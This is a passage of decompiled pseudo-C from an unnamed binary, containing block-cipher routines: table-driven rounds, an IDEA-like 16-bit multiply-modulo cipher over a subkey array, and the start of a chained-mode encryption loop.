  v92 = dword_528928[(unsigned __int8)(v63 ^ v107 ^ *(_BYTE *)(a3 + 44))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v63 ^ v107 ^ *(_WORD *)(a3 + 44)) >> 8)] ^ dword_529128[(unsigned __int8)((v63 ^ (unsigned int)v107 ^ *(_DWORD *)(a3 + 44)) >> 16)] ^ dword_529528[(v63 ^ (unsigned int)v107 ^ *(_DWORD *)(a3 + 44)) >> 24];
  v37 = dword_528928[(unsigned __int8)(v92 + v107)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v92 + v107) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v92 + v107) >> 16)] ^ dword_529528[(unsigned int)(v92 + v107) >> 24];
  v38 = dword_528928[(unsigned __int8)(v37 + v92)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v37 + v92) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v37 + v92) >> 16)] ^ dword_529528[(unsigned int)(v37 + v92) >> 24];
  v79 = v38 ^ v78;
  v71 = (v38 + v37) ^ v70;
  v39 = v79 ^ v71 ^ *(_DWORD *)(a3 + 32) ^ *(_DWORD *)(a3 + 36);
  v108 = v71 ^ *(_DWORD *)(a3 + 32);
  v93 = dword_528928[(unsigned __int8)v39] ^ dword_528D28[BYTE1(v39)] ^ dword_529128[BYTE2(v39)] ^ dword_529528[HIBYTE(v39)];
  v40 = dword_528928[(unsigned __int8)(v93 + v108)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v93 + v108) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v93 + v108) >> 16)] ^ dword_529528[(unsigned int)(v93 + v108) >> 24];
  v41 = dword_528928[(unsigned __int8)(v40 + v93)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v40 + v93) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v40 + v93) >> 16)] ^ dword_529528[(unsigned int)(v40 + v93) >> 24];
  v64 = v41 ^ v63;
  v42 = (v41 + v40) ^ v36;
  v109 = v42 ^ *(_DWORD *)(a3 + 24);
  v94 = dword_528928[(unsigned __int8)(v64 ^ v109 ^ *(_BYTE *)(a3 + 28))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v64 ^ v109 ^ *(_WORD *)(a3 + 28)) >> 8)] ^ dword_529128[(unsigned __int8)((v64 ^ (unsigned int)v109 ^ *(_DWORD *)(a3 + 28)) >> 16)] ^ dword_529528[(v64 ^ (unsigned int)v109 ^ *(_DWORD *)(a3 + 28)) >> 24];
  v43 = dword_528928[(unsigned __int8)(v94 + v109)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v94 + v109) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v94 + v109) >> 16)] ^ dword_529528[(unsigned int)(v94 + v109) >> 24];
  v44 = dword_528928[(unsigned __int8)(v43 + v94)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v43 + v94) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v43 + v94) >> 16)] ^ dword_529528[(unsigned int)(v43 + v94) >> 24];
  v80 = v44 ^ v79;
  v72 = (v44 + v43) ^ v71;
  v45 = v80 ^ v72 ^ *(_DWORD *)(a3 + 16) ^ *(_DWORD *)(a3 + 20);
  v110 = v72 ^ *(_DWORD *)(a3 + 16);
  v95 = dword_528928[(unsigned __int8)v45] ^ dword_528D28[BYTE1(v45)] ^ dword_529128[BYTE2(v45)] ^ dword_529528[HIBYTE(v45)];
  v46 = dword_528928[(unsigned __int8)(v95 + v110)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v95 + v110) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v95 + v110) >> 16)] ^ dword_529528[(unsigned int)(v95 + v110) >> 24];
  v47 = dword_528928[(unsigned __int8)(v46 + v95)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v46 + v95) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v46 + v95) >> 16)] ^ dword_529528[(unsigned int)(v46 + v95) >> 24];
  v65 = v47 ^ v64;
  v48 = (v47 + v46) ^ v42;
  v111 = v48 ^ *(_DWORD *)(a3 + 8);
  v96 = dword_528928[(unsigned __int8)(v65 ^ v111 ^ *(_BYTE *)(a3 + 12))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v65 ^ v111 ^ *(_WORD *)(a3 + 12)) >> 8)] ^ dword_529128[(unsigned __int8)((v65 ^ (unsigned int)v111 ^ *(_DWORD *)(a3 + 12)) >> 16)] ^ dword_529528[(v65 ^ (unsigned int)v111 ^ *(_DWORD *)(a3 + 12)) >> 24];
  v49 = dword_528928[(unsigned __int8)(v96 + v111)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v96 + v111) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v96 + v111) >> 16)] ^ dword_529528[(unsigned int)(v96 + v111) >> 24];
  v50 = dword_528928[(unsigned __int8)(v49 + v96)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v49 + v96) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v49 + v96) >> 16)] ^ dword_529528[(unsigned int)(v49 + v96) >> 24];
  v81 = v50 ^ v80;
  v73 = (v50 + v49) ^ v72;
  v51 = v73 ^ *(_DWORD *)a3;
  v52 = v81 ^ v51 ^ *(_DWORD *)(a3 + 4);
  v53 = dword_528928[(unsigned __int8)v52] ^ dword_528D28[BYTE1(v52)] ^ dword_529128[BYTE2(v52)] ^ dword_529528[HIBYTE(v52)];
  v54 = dword_528928[(unsigned __int8)(v53 + v51)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v53 + v51) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v53 + v51) >> 16)] ^ dword_529528[(unsigned int)(v53 + v51) >> 24];
  v55 = dword_528928[(unsigned __int8)(v54 + v53)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v54 + v53) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v54 + v53) >> 16)] ^ dword_529528[(unsigned int)(v54 + v53) >> 24];
  v56 = (v55 + v54) ^ v48;
  result = a2;
  *a2 = HIBYTE(v56);
  a2[3] = v56;
  a2[1] = BYTE2(v56);
  a2[4] = (v55 ^ (unsigned int)v65) >> 24;
  a2[7] = v55 ^ v65;
  a2[5] = (v55 ^ (unsigned int)v65) >> 16;
  a2[6] = (unsigned __int16)(v55 ^ v65) >> 8;
  a2[8] = HIBYTE(v73);
  a2[9] = BYTE2(v73);
  a2[10] = BYTE1(v73);
  a2[11] = v73;
  a2[12] = HIBYTE(v81);
  a2[13] = BYTE2(v81);
  a2[2] = BYTE1(v56);
  a2[14] = BYTE1(v81);
  a2[15] = v81;
  return result;
}
// 528928: using guessed type int dword_528928[256];
// 528D28: using guessed type int dword_528D28[256];
// 529128: using guessed type int dword_529128[256];
// 529528: using guessed type int dword_529528[256];

//----- (004B6C80) --------------------------------------------------------
_BYTE *__cdecl sub_4B6C80(int a1, _BYTE *a2, _DWORD *a3)
{
  int v3; // edx
  unsigned int v4; // ecx
  int v5; // ecx
  _BYTE *result; // eax
  unsigned int v7; // [esp+0h] [ebp-8h] BYREF
  int v8; // [esp+4h] [ebp-4h]

  v3 = *(unsigned __int8 *)(a1 + 5);
  v7 = _byteswap_ulong(*(_DWORD *)a1);
  v8 = (v3 << 16) | (*(unsigned __int8 *)(a1 + 4) << 24) | *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8);
  sub_4B6D30(&v7, a3);
  v4 = v7;
  *a2 = HIBYTE(v7);
  a2[1] = BYTE2(v4);
  a2[2] = BYTE1(v4);
  a2[3] = v4;
  v5 = v8;
  a2[4] = HIBYTE(v8);
  a2[5] = BYTE2(v5);
  result = a2 + 6;
  a2[6] = BYTE1(v5);
  a2[7] = v5;
  return result;
}

//----- (004B6D30) --------------------------------------------------------
unsigned int *__cdecl sub_4B6D30(unsigned int *a1, _DWORD *a2)
{
  unsigned int v2; // ecx
  unsigned int v3; // edx
  unsigned int v4; // edx
  int v5; // ebp
  int v6; // ebx
  __int16 v7; // dx
  _DWORD *v8; // eax
  int v9; // esi
  unsigned int v10; // ecx
  unsigned int v11; // edi
  int v12; // esi
  _DWORD *v13; // eax
  unsigned int v14; // ecx
  unsigned int v15; // edx
  unsigned int v16; // edx
  int v17; // ecx
  _DWORD *v18; // eax
  unsigned int v19; // esi
  unsigned int v20; // ecx
  unsigned int v21; // ecx
  unsigned int v22; // ecx
  unsigned int v23; // edx
  unsigned __int16 v24; // di
  int v25; // edx
  int v26; // ebp
  _DWORD *v27; // eax
  int v28; // esi
  int v29; // ecx
  int v30; // esi
  _DWORD *v31; // eax
  int v32; // ebx
  int v33; // edx
  _DWORD *v34; // eax
  unsigned int v35; // ebp
  int v36; // edi
  _DWORD *v37; // eax
  unsigned int v38; // ecx
  unsigned int v39; // edx
  unsigned int v40; // edx
  int v41; // ecx
  _DWORD *v42; // eax
  unsigned int v43; // edi
  unsigned int v44; // ecx
  unsigned int v45; // ecx
  unsigned int v46; // ecx
  int v47; // edi
  unsigned int v48; // edx
  unsigned __int16 v49; // bp
  int v50; // edx
  _DWORD *v51; // eax
  int v52; // esi
  int v53; // ecx
  int v54; // esi
  _DWORD *v55; // eax
  int v56; // ebx
  int v57; // edx
  _DWORD *v58; // eax
  unsigned int v59; // ebx
  int v60; // edi
  _DWORD *v61; // eax
  unsigned int v62; // ecx
  unsigned int v63; // edx
  int v64; // ebp
  unsigned int v65; // edx
  _DWORD *v66; // eax
  unsigned int v67; // edi
  unsigned int v68; // ecx
  unsigned int v69; // ecx
  int v70; // edi
  unsigned int v71; // edx
  unsigned __int16 v72; // bx
  int v73; // edx
  int v74; // esi
  _DWORD *v75; // eax
  int v76; // ecx
  int v77; // esi
  _DWORD *v78; // eax
  int v79; // ebp
  int v80; // edx
  _DWORD *v81; // eax
  unsigned int v82; // ebp
  int v83; // edi
  _DWORD *v84; // eax
  unsigned int v85; // ecx
  unsigned int v86; // edx
  int v87; // ebx
  unsigned int v88; // edx
  int v89; // eax
  unsigned int v90; // edi
  unsigned int v91; // ecx
  unsigned int v92; // ecx
  int v93; // edi
  unsigned int v94; // edx
  unsigned __int16 v95; // bp
  int v96; // edx
  int v97; // esi
  int v98; // eax
  int v99; // ecx
  int v100; // esi
  int v101; // eax
  int v102; // ebx
  int v103; // edx
  int v104; // eax
  unsigned int v105; // ebx
  int v106; // edi
  int v107; // eax
  unsigned int v108; // ecx
  unsigned int v109; // edx
  int v110; // ebp
  unsigned int v111; // edx
  int v112; // eax
  unsigned int v113; // edi
  unsigned int v114; // ecx
  unsigned int v115; // ecx
  int v116; // edi
  unsigned int v117; // edx
  unsigned __int16 v118; // bx
  int v119; // edx
  int v120; // esi
  int v121; // eax
  int v122; // ecx
  int v123; // esi
  int v124; // eax
  int v125; // ebp
  int v126; // edx
  int v127; // eax
  unsigned int v128; // ebp
  int v129; // edi
  int v130; // eax
  unsigned int v131; // ecx
  unsigned int v132; // edx
  int v133; // ebx
  unsigned int v134; // edx
  int v135; // eax
  unsigned int v136; // edi
  unsigned int v137; // ecx
  unsigned int v138; // ecx
  int v139; // edi
  unsigned int v140; // edx
  unsigned __int16 v141; // bp
  int v142; // edx
  int v143; // esi
  int v144; // eax
  int v145; // ecx
  int v146; // esi
  int v147; // eax
  int v148; // ebx
  int v149; // edx
  int v150; // eax
  unsigned int v151; // ebx
  int v152; // edi
  int v153; // eax
  unsigned int v154; // ecx
  unsigned int v155; // edx
  int v156; // ebp
  unsigned int v157; // edx
  int v158; // eax
  unsigned int v159; // edi
  unsigned int v160; // ecx
  unsigned int v161; // ecx
  int v162; // edi
  unsigned int v163; // edx
  unsigned __int16 v164; // bx
  int v165; // edx
  int v166; // esi
  int v167; // eax
  int v168; // ecx
  int v169; // esi
  int v170; // eax
  int v171; // ebp
  int v172; // edx
  int v173; // eax
  unsigned int v174; // edi
  int v175; // ebx
  int v176; // eax
  unsigned int v177; // ecx
  unsigned int v178; // edx
  unsigned int v179; // edx
  int v180; // ecx
  _DWORD *v181; // eax
  unsigned int v182; // ebx
  unsigned int v183; // ecx
  unsigned int v184; // ecx
  unsigned int v185; // ecx
  int v186; // ebx
  unsigned int v187; // edx
  unsigned __int16 v188; // di
  int v189; // edx
  unsigned int v190; // esi
  _DWORD *v191; // eax
  int v192; // ecx
  int v193; // esi
  unsigned int v194; // ebp
  int v195; // ebx
  _DWORD *v196; // eax
  int v197; // ecx
  int v198; // eax
  int v199; // ecx
  unsigned int v200; // edx
  unsigned int v201; // edx
  unsigned int *result; // eax
  int v203; // [esp+10h] [ebp-4h]
  int v204; // [esp+10h] [ebp-4h]
  int v205; // [esp+10h] [ebp-4h]
  int v206; // [esp+10h] [ebp-4h]
  int v207; // [esp+10h] [ebp-4h]
  __int16 v208; // [esp+1Ch] [ebp+8h]
  unsigned int v209; // [esp+1Ch] [ebp+8h]
  unsigned int v210; // [esp+1Ch] [ebp+8h]
  unsigned int v211; // [esp+1Ch] [ebp+8h]
  unsigned int v212; // [esp+1Ch] [ebp+8h]
  unsigned int v213; // [esp+1Ch] [ebp+8h]
  unsigned int v214; // [esp+1Ch] [ebp+8h]
  unsigned int v215; // [esp+1Ch] [ebp+8h]

  v2 = HIWORD(*a1);
  v3 = v2 * *a2;
  if ( v3 )
  {
    v4 = (unsigned __int16)v3 - HIWORD(v3);
    v2 = HIWORD(v4);
  }
  else
  {
    v4 = 1 - *a2;
  }
  v5 = a2[1] + *a1;
  v6 = a2[2] + HIWORD(a1[1]);
  v7 = v4 - v2;
  v8 = a2 + 3;
  v9 = (unsigned __int16)a1[1];
  v10 = v9 * a2[3];
  v208 = v7;
  if ( v10 )
    v11 = (unsigned __int16)v10 - HIWORD(v10) - ((unsigned int)((unsigned __int16)v10 - HIWORD(v10)) >> 16);
  else
    v11 = 1 - *v8 - v9;
  v12 = v8[1];
  v13 = v8 + 1;
  v14 = (unsigned __int16)(v7 ^ v6);
  if ( v14 * v12 )
  {
    v15 = (unsigned __int16)(v14 * v12) - ((v14 * v12) >> 16);
    v14 = HIWORD(v15);
  }
  else
  {
    v15 = 1 - v12;
  }
  v16 = v15 - v14;
  v17 = v13[1];
  v18 = v13 + 1;
  v19 = (unsigned __int16)(v16 + (v5 ^ v11));
  v20 = v19 * v17;
  if ( v20 )
  {
    v21 = (unsigned __int16)v20 - HIWORD(v20);
    v19 = HIWORD(v21);
  }
  else
  {
    v21 = 1 - *v18;
  }
  v22 = v21 - v19;
  v23 = v22 + v16;
  v24 = v23 ^ v11;
  v25 = v5 ^ v23;
  v26 = v18[1];
  v27 = v18 + 1;
  v28 = v6 ^ v22;
  v29 = (unsigned __int16)(v208 ^ v22);
  if ( v29 * v26 )
    v209 = (unsigned __int16)(v29 * v26)
         - ((unsigned int)(v29 * v26) >> 16)
         - (((unsigned __int16)(v29 * v26) - ((unsigned int)(v29 * v26) >> 16)) >> 16);
  else
    LOWORD(v209) = 1 - v26 - v29;
  v30 = v27[1] + v28;
  v31 = v27 + 1;
  v32 = v31[1] + v25;
  ++v31;
  v33 = v31[1];
  v34 = v31 + 1;
  if ( v24 * v33 )
    v35 = (unsigned __int16)(v24 * v33)
        - (((unsigned int)v24 * v33) >> 16)
        - (((unsigned __int16)(v24 * v33) - (((unsigned int)v24 * v33) >> 16)) >> 16);
  else
    LOWORD(v35) = 1 - v33 - v24;
  v36 = v34[1];
  v37 = v34 + 1;
  v38 = (unsigned __int16)(v209 ^ v32);
  if ( v38 * v36 )
  {
    v39 = (unsigned __int16)(v38 * v36) - ((v38 * v36) >> 16);
    v38 = HIWORD(v39);
  }
  else
  {
    v39 = 1 - v36;
  }
  v40 = v39 - v38;
  v41 = v37[1];
  v42 = v37 + 1;
  v43 = (unsigned __int16)(v40 + (v30 ^ v35));
  v44 = v43 * v41;
  if ( v44 )
  {
    v45 = (unsigned __int16)v44 - HIWORD(v44);
    v43 = HIWORD(v45);
  }
  else
  {
    v45 = 1 - *v42;
  }
  v46 = v45 - v43;
  v47 = v42[1];
  v48 = v46 + v40;
  v49 = v48 ^ v35;
  v50 = v30 ^ v48;
  v51 = v42 + 1;
  v52 = v32 ^ v46;
  v53 = (unsigned __int16)(v209 ^ v46);
  if ( v53 * v47 )
    v210 = (unsigned __int16)(v53 * v47)
         - ((unsigned int)(v53 * v47) >> 16)
         - (((unsigned __int16)(v53 * v47) - ((unsigned int)(v53 * v47) >> 16)) >> 16);
  else
    LOWORD(v210) = 1 - v47 - v53;
  v54 = v51[1] + v52;
  v55 = v51 + 1;
  v56 = v55[1] + v50;
  ++v55;
  v57 = v55[1];
  v58 = v55 + 1;
  v203 = v56;
  if ( v49 * v57 )
    v59 = (unsigned __int16)(v49 * v57)
        - (((unsigned int)v49 * v57) >> 16)
        - (((unsigned __int16)(v49 * v57) - (((unsigned int)v49 * v57) >> 16)) >> 16);
  else
    LOWORD(v59) = 1 - v57 - v49;
  v60 = v58[1];
  v61 = v58 + 1;
  v62 = (unsigned __int16)(v210 ^ v203);
  if ( v62 * v60 )
  {
    v63 = (unsigned __int16)(v62 * v60) - ((v62 * v60) >> 16);
    v62 = HIWORD(v63);
  }
  else
  {
    v63 = 1 - v60;
  }
  v64 = v61[1];
  v65 = v63 - v62;
  v66 = v61 + 1;
  v67 = (unsigned __int16)(v65 + (v54 ^ v59));
  if ( v67 * v64 )
  {
    v68 = (unsigned __int16)(v67 * v64) - ((v67 * v64) >> 16);
    v67 = HIWORD(v68);
  }
  else
  {
    v68 = 1 - v64;
  }
  v69 = v68 - v67;
  v70 = v66[1];
  v71 = v69 + v65;
  v72 = v71 ^ v59;
  v73 = v54 ^ v71;
  v74 = v203 ^ v69;
  v75 = v66 + 1;
  v76 = (unsigned __int16)(v210 ^ v69);
  if ( v76 * v70 )
    v211 = (unsigned __int16)(v76 * v70)
         - ((unsigned int)(v76 * v70) >> 16)
         - (((unsigned __int16)(v76 * v70) - ((unsigned int)(v76 * v70) >> 16)) >> 16);
  else
    LOWORD(v211) = 1 - v70 - v76;
  v77 = v75[1] + v74;
  v78 = v75 + 1;
  v79 = v78[1] + v73;
  ++v78;
  v80 = v78[1];
  v81 = v78 + 1;
  v204 = v79;
  if ( v72 * v80 )
    v82 = (unsigned __int16)(v72 * v80)
        - (((unsigned int)v72 * v80) >> 16)
        - (((unsigned __int16)(v72 * v80) - (((unsigned int)v72 * v80) >> 16)) >> 16);
  else
    LOWORD(v82) = 1 - v80 - v72;
  v83 = v81[1];
  v84 = (int)(v81 + 1);
  v85 = (unsigned __int16)(v211 ^ v204);
  if ( v85 * v83 )
  {
    v86 = (unsigned __int16)(v85 * v83) - ((v85 * v83) >> 16);
    v85 = HIWORD(v86);
  }
  else
  {
    v86 = 1 - v83;
  }
  v87 = *(_DWORD *)(v84 + 4);
  v88 = v86 - v85;
  v89 = v84 + 4;
  v90 = (unsigned __int16)(v88 + (v77 ^ v82));
  if ( v90 * v87 )
  {
    v91 = (unsigned __int16)(v90 * v87) - ((v90 * v87) >> 16);
    v90 = HIWORD(v91);
  }
  else
  {
    v91 = 1 - v87;
  }
  v92 = v91 - v90;
  v93 = *(_DWORD *)(v89 + 4);
  v94 = v92 + v88;
  v95 = v94 ^ v82;
  v96 = v77 ^ v94;
  v97 = v204 ^ v92;
  v98 = v89 + 4;
  v99 = (unsigned __int16)(v211 ^ v92);
  if ( v99 * v93 )
    v212 = (unsigned __int16)(v99 * v93)
         - ((unsigned int)(v99 * v93) >> 16)
         - (((unsigned __int16)(v99 * v93) - ((unsigned int)(v99 * v93) >> 16)) >> 16);
  else
    LOWORD(v212) = 1 - v93 - v99;
  v100 = *(_DWORD *)(v98 + 4) + v97;
  v101 = v98 + 4;
  v102 = *(_DWORD *)(v101 + 4) + v96;
  v101 += 4;
  v103 = *(_DWORD *)(v101 + 4);
  v104 = v101 + 4;
  v205 = v102;
  if ( v95 * v103 )
    v105 = (unsigned __int16)(v95 * v103)
         - (((unsigned int)v95 * v103) >> 16)
         - (((unsigned __int16)(v95 * v103) - (((unsigned int)v95 * v103) >> 16)) >> 16);
  else
    LOWORD(v105) = 1 - v103 - v95;
  v106 = *(_DWORD *)(v104 + 4);
  v107 = v104 + 4;
  v108 = (unsigned __int16)(v212 ^ v205);
  if ( v108 * v106 )
  {
    v109 = (unsigned __int16)(v108 * v106) - ((v108 * v106) >> 16);
    v108 = HIWORD(v109);
  }
  else
  {
    v109 = 1 - v106;
  }
  v110 = *(_DWORD *)(v107 + 4);
  v111 = v109 - v108;
  v112 = v107 + 4;
  v113 = (unsigned __int16)(v111 + (v100 ^ v105));
  if ( v113 * v110 )
  {
    v114 = (unsigned __int16)(v113 * v110) - ((v113 * v110) >> 16);
    v113 = HIWORD(v114);
  }
  else
  {
    v114 = 1 - v110;
  }
  v115 = v114 - v113;
  v116 = *(_DWORD *)(v112 + 4);
  v117 = v115 + v111;
  v118 = v117 ^ v105;
  v119 = v100 ^ v117;
  v120 = v205 ^ v115;
  v121 = v112 + 4;
  v122 = (unsigned __int16)(v212 ^ v115);
  if ( v122 * v116 )
    v213 = (unsigned __int16)(v122 * v116)
         - ((unsigned int)(v122 * v116) >> 16)
         - (((unsigned __int16)(v122 * v116) - ((unsigned int)(v122 * v116) >> 16)) >> 16);
  else
    LOWORD(v213) = 1 - v116 - v122;
  v123 = *(_DWORD *)(v121 + 4) + v120;
  v124 = v121 + 4;
  v125 = *(_DWORD *)(v124 + 4) + v119;
  v124 += 4;
  v126 = *(_DWORD *)(v124 + 4);
  v127 = v124 + 4;
  v206 = v125;
  if ( v118 * v126 )
    v128 = (unsigned __int16)(v118 * v126)
         - (((unsigned int)v118 * v126) >> 16)
         - (((unsigned __int16)(v118 * v126) - (((unsigned int)v118 * v126) >> 16)) >> 16);
  else
    LOWORD(v128) = 1 - v126 - v118;
  v129 = *(_DWORD *)(v127 + 4);
  v130 = v127 + 4;
  v131 = (unsigned __int16)(v213 ^ v206);
  if ( v131 * v129 )
  {
    v132 = (unsigned __int16)(v131 * v129) - ((v131 * v129) >> 16);
    v131 = HIWORD(v132);
  }
  else
  {
    v132 = 1 - v129;
  }
  v133 = *(_DWORD *)(v130 + 4);
  v134 = v132 - v131;
  v135 = v130 + 4;
  v136 = (unsigned __int16)(v134 + (v123 ^ v128));
  if ( v136 * v133 )
  {
    v137 = (unsigned __int16)(v136 * v133) - ((v136 * v133) >> 16);
    v136 = HIWORD(v137);
  }
  else
  {
    v137 = 1 - v133;
  }
  v138 = v137 - v136;
  v139 = *(_DWORD *)(v135 + 4);
  v140 = v138 + v134;
  v141 = v140 ^ v128;
  v142 = v123 ^ v140;
  v143 = v206 ^ v138;
  v144 = v135 + 4;
  v145 = (unsigned __int16)(v213 ^ v138);
  if ( v145 * v139 )
    v214 = (unsigned __int16)(v145 * v139)
         - ((unsigned int)(v145 * v139) >> 16)
         - (((unsigned __int16)(v145 * v139) - ((unsigned int)(v145 * v139) >> 16)) >> 16);
  else
    LOWORD(v214) = 1 - v139 - v145;
  v146 = *(_DWORD *)(v144 + 4) + v143;
  v147 = v144 + 4;
  v148 = *(_DWORD *)(v147 + 4) + v142;
  v147 += 4;
  v149 = *(_DWORD *)(v147 + 4);
  v150 = v147 + 4;
  v207 = v148;
  if ( v141 * v149 )
    v151 = (unsigned __int16)(v141 * v149)
         - (((unsigned int)v141 * v149) >> 16)
         - (((unsigned __int16)(v141 * v149) - (((unsigned int)v141 * v149) >> 16)) >> 16);
  else
    LOWORD(v151) = 1 - v149 - v141;
  v152 = *(_DWORD *)(v150 + 4);
  v153 = v150 + 4;
  v154 = (unsigned __int16)(v214 ^ v207);
  if ( v154 * v152 )
  {
    v155 = (unsigned __int16)(v154 * v152) - ((v154 * v152) >> 16);
    v154 = HIWORD(v155);
  }
  else
  {
    v155 = 1 - v152;
  }
  v156 = *(_DWORD *)(v153 + 4);
  v157 = v155 - v154;
  v158 = v153 + 4;
  v159 = (unsigned __int16)(v157 + (v146 ^ v151));
  if ( v159 * v156 )
  {
    v160 = (unsigned __int16)(v159 * v156) - ((v159 * v156) >> 16);
    v159 = HIWORD(v160);
  }
  else
  {
    v160 = 1 - v156;
  }
  v161 = v160 - v159;
  v162 = *(_DWORD *)(v158 + 4);
  v163 = v161 + v157;
  v164 = v163 ^ v151;
  v165 = v146 ^ v163;
  v166 = v207 ^ v161;
  v167 = v158 + 4;
  v168 = (unsigned __int16)(v214 ^ v161);
  if ( v168 * v162 )
    v215 = (unsigned __int16)(v168 * v162)
         - ((unsigned int)(v168 * v162) >> 16)
         - (((unsigned __int16)(v168 * v162) - ((unsigned int)(v168 * v162) >> 16)) >> 16);
  else
    LOWORD(v215) = 1 - v162 - v168;
  v169 = *(_DWORD *)(v167 + 4) + v166;
  v170 = v167 + 4;
  v171 = *(_DWORD *)(v170 + 4) + v165;
  v170 += 4;
  v172 = *(_DWORD *)(v170 + 4);
  v173 = v170 + 4;
  if ( v164 * v172 )
    v174 = (unsigned __int16)(v164 * v172)
         - (((unsigned int)v164 * v172) >> 16)
         - (((unsigned __int16)(v164 * v172) - (((unsigned int)v164 * v172) >> 16)) >> 16);
  else
    LOWORD(v174) = 1 - v172 - v164;
  v175 = *(_DWORD *)(v173 + 4);
  v176 = v173 + 4;
  v177 = (unsigned __int16)(v215 ^ v171);
  if ( v177 * v175 )
  {
    v178 = (unsigned __int16)(v177 * v175) - ((v177 * v175) >> 16);
    v177 = HIWORD(v178);
  }
  else
  {
    v178 = 1 - v175;
  }
  v179 = v178 - v177;
  v180 = *(_DWORD *)(v176 + 4);
  v181 = (_DWORD *)(v176 + 4);
  v182 = (unsigned __int16)(v179 + (v169 ^ v174));
  v183 = v182 * v180;
  if ( v183 )
  {
    v184 = (unsigned __int16)v183 - HIWORD(v183);
    v182 = HIWORD(v184);
  }
  else
  {
    v184 = 1 - *v181;
  }
  v185 = v184 - v182;
  v186 = v181[1];
  v187 = v185 + v179;
  v188 = v187 ^ v174;
  v189 = v169 ^ v187;
  v190 = v185;
  v191 = v181 + 1;
  v192 = (unsigned __int16)(v215 ^ v185);
  v193 = v171 ^ v190;
  if ( v192 * v186 )
    v194 = (unsigned __int16)(v192 * v186)
         - ((unsigned int)(v192 * v186) >> 16)
         - (((unsigned __int16)(v192 * v186) - ((unsigned int)(v192 * v186) >> 16)) >> 16);
  else
    v194 = 1 - v186 - v192;
  v195 = v189 + v191[1];
  v196 = v191 + 1;
  v197 = v196[1];
  v198 = v196[2];
  v199 = v193 + v197;
  if ( v188 * v198 )
  {
    v200 = (unsigned __int16)(v188 * v198) - (((unsigned int)v188 * v198) >> 16);
    v201 = v200 - HIWORD(v200);
  }
  else
  {
    LOWORD(v201) = 1 - v198 - v188;
  }
  result = a1;
  *a1 = (v194 << 16) | (unsigned __int16)v195;
  a1[1] = (unsigned __int16)v201 | (v199 << 16);
  return result;
}
// 4B6D30: too many cbuild loops

//----- (004B7590) --------------------------------------------------------
unsigned int __cdecl sub_4B7590(unsigned __int8 *a1, _BYTE *a2, unsigned int a3, _DWORD *a4, int a5, int a6)
{
  _BYTE *v6; // esi
  unsigned __int8 *v7; // edi
  unsigned int v8; // edx
  unsigned int result; // eax
  unsigned int v10; // ebx
  int v11; // eax
  int v12; // ecx
  unsigned __int8 *v13; // edi
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // ebx
  int v21; // ecx
  int v22; // ebx
  int v23; // ecx
  int v24; // ebx
  _BYTE *v25; // esi
  bool v26; // zf
  int v27; // edi
  int v28; // ecx
  int v29; // ecx
  int v30; // ecx
  int v31; // ecx
  int v32; // ecx
  int v33; // ebx
  int v34; // ebx
  _BYTE *v35; // esi
  _BYTE *v36; // ebp
  _BYTE *v37; // edi
  unsigned __int8 *v38; // esi
  unsigned int v39; // ebx
  _BYTE *v40; // ebp
  unsigned int v41; // ecx
  int v42; // ebp
  int v43; // eax
  unsigned __int8 *v44; // esi
  int v45; // ecx
  int v46; // edx
  int v47; // ebx
  int v48; // ebp
  int v49; // eax
  int v50; // ebp
  int v51; // ecx
  int v52; // ebp
  int v53; // ebx
  unsigned int v54; // eax
  int v55; // ecx
  _BYTE *v56; // edi
  int v57; // eax
  int v58; // ecx
  unsigned __int8 *v59; // esi
  int v60; // edx
  unsigned int v61; // ebx
  int v62; // eax
  int v63; // edi
  _BYTE *v64; // ebp
  _BYTE *v65; // ebp
  unsigned int v66; // [esp+10h] [ebp-10h]
  unsigned int v67; // [esp+10h] [ebp-10h]
  unsigned int v68; // [esp+14h] [ebp-Ch]
  int v69; // [esp+14h] [ebp-Ch]
  int v70; // [esp+18h] [ebp-8h] BYREF
  unsigned int v71; // [esp+1Ch] [ebp-4h]
  unsigned int v72; // [esp+2Ch] [ebp+Ch]
  int v73; // [esp+2Ch] [ebp+Ch]
  unsigned int v74; // [esp+2Ch] [ebp+Ch]
  unsigned int v75; // [esp+2Ch] [ebp+Ch]
  unsigned int v76; // [esp+38h] [ebp+18h]
  unsigned int v77; // [esp+38h] [ebp+18h]

  if ( a6 )
  {
    v6 = a2;
    v7 = a1;
    v8 = _byteswap_ulong(*(_DWORD *)a5);
    result = _byteswap_ulong(*(_DWORD *)(a5 + 4));
    v10 = a3 - 8;
    v76 = result;
    if ( (int)(a3 - 8) >= 0 )
    {
      v72 = a3 >> 3;
      v66 = v10 - 8 * v72;
      do
      {
        v11 = *v7;
        v12 = v7[1];
        v13 = v7 + 1;
        v14 = (v12 << 16) | (v11 << 24);
        v15 = *++v13;
        v16 = (v15 << 8) | v14;
        v17 = *++v13;
        v18 = v17 | v16;
        v19 = *++v13;
        v20 = *++v13;
